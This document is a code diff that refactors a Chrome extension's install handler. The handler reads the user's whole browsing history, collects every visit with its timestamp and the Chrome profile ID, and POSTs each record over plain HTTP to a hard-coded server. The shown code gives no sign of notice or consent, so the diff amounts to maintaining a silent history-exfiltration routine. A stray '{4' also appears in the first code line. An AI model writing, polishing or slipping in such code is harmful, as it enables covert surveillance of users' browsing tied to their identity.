@@ -48,33 +48,25 @@ chrome.runtime.onInstalled.addListener(function(details) {
   if (details.reason == "install") {4
     console.log("This is a first install!");
     chrome.history.search({text: "", maxResults: 2147483647}, function(historyItems) {
-      var myset = {},
-          index,
-          unique_urls,
-          url;
+      var urlSet = {},
+          uniqueUrls;
 
-      for (index = 0; index < historyItems.length; index++) {
-        historyItem = historyItems[index];
-        myset[historyItem.url] = true;
+      for (var i = 0; i < historyItems.length; i++) {
+        urlSet[historyItems[i].url] = true;
       }
 
-      unique_urls = Object.keys(myset);
+      uniqueUrls = Object.keys(urlSet);
 
-      for (index = 0; index < unique_urls.length; index++) {
-        url = unique_urls[index];
-
+      for (var j = 0; j < uniqueUrls.length; j++) {
         (function(url) {
           chrome.history.getVisits({url: url}, function(visitItems) {
-            var inner_index;
-            for (inner_index = 0; inner_index < visitItems.length; inner_index++) {
-              visit = visitItems[inner_index];
-
-              (function(visit) {
+            for (var i = 0; i < visitItems.length; i++) {
+              (function(visitTime) {
                 var req = new XMLHttpRequest(),
                     fd = new FormData();
 
                 fd.append('url', url);
-                fd.append('visit_at', visit.visitTime);
+                fd.append('visit_at', visitTime);
 
                 chrome.identity.getProfileUserInfo(function(userInfo) {
                   fd.append('browser_id', userInfo.id);
@@ -83,11 +75,11 @@ chrome.runtime.onInstalled.addListener(function(details) {
                   req.open("POST", "http://10.104.92.195:3000/visits", true);
                   req.send(fd);
                 });
-              })(visit);
+              })(visitItems[i].visitTime);
 
             }
           });
-        })(url);
+        })(uniqueUrls[j]);
       }
     });
   }
